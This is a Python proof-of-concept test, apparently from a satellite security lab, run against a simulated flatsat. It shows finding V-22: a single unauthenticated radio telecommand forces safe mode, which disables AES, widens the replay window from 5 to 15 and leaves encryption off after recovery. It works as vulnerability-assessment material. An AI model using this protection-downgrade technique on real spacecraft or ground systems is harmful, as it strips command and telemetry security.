#!/usr/bin/env python3
# SPDX-License-Identifier: GPL-2.0-or-later
import os, sys, struct
sys.path.insert(0, os.path.join(os.path.dirname(os.path.abspath(__file__)), "lib"))
import fslab
from fslab import check
import flatsat_sim as fs


# V-22  Forced safe-mode is a protection downgrade: entering safe turns
# the AES engine OFF and relaxes the replay window 5 -> 15, and the
# downgrade PERSISTS after the craft recovers (SV-CF-4 analogue).
# SPARTA: CO-0005 / protection bypass by state forcing
def main(dev, ev):
    dev.tc(0x15, bytes([1, 16, 5]), via="usb")       # SDLS on, ARC window 5
    w0 = dev.find(dev.tc(0x15, bytes([1, 16, 5]), via="usb"), 0x15)[0]
    st = dev.find(dev.tc(0x0C, b"", via="usb"), 0x0C)[0]
    ev.log(f"nominal: secure={bool(st.u8(2) & 0x10)} arc_window={w0.u8(4)}")
    check(w0.u8(4) == 5, "window 5 nominal")
    # one unauthenticated TC forces safe mode
    r = dev.find(dev.tc(0x1D, bytes([2]), via="radio"), 0x1D)[0]
    check(r.u8(2) == 1, "safe mode entered")
    st = dev.find(dev.tc(0x0C, b"", via="usb"), 0x0C)[0]
    w1 = dev.find(dev.tc(0x15, bytes([1, 16, 5]), via="usb"), 0x15)[0]
    ev.log(f"in safe: secure={bool(st.u8(2) & 0x10)} arc_window={w1.u8(4)} "
           f"(AES engine OFF, replay window relaxed 5 -> 15)")
    check(not (st.u8(2) & 0x10), "crypto OFF in safe mode")
    check(w1.u8(4) == 15, "ARC window relaxed to 15 in safe mode")
    # operator cannot even leave safe-mode on demand inside the window
    rel = dev.tc(0x1D, bytes([3]), via="usb")
    check(dev.err_text(rel) == "RELEASE WINDOW", "forced safe cannot be "
          "cancelled immediately -> attacker owns the relaxed state >= 120 s")
    dev.advance(121000)
    rel = dev.find(dev.tc(0x1D, bytes([3]), via="usb"), 0x1D)[0]
    check(rel.u8(2) == 1, "released after the window")
    st = dev.find(dev.tc(0x0C, b"", via="usb"), 0x0C)[0]
    ev.log(f"after recovery: NOMINAL again but secure={bool(st.u8(2) & 0x10)} "
           f"-> downgrade OUTLIVES the safe-mode episode")
    check(not (st.u8(2) & 0x10), "crypto stays OFF after nominal restored")
    ev.log("cost to attacker: 1 TC; benefit: >=120 s relaxed replay window "
           "+ permanent cleartext telemetry until the operator notices")

if __name__ == "__main__":
    sys.exit(fslab.run_poc(__file__, "V-22 forced safe-mode protection downgrade", main))
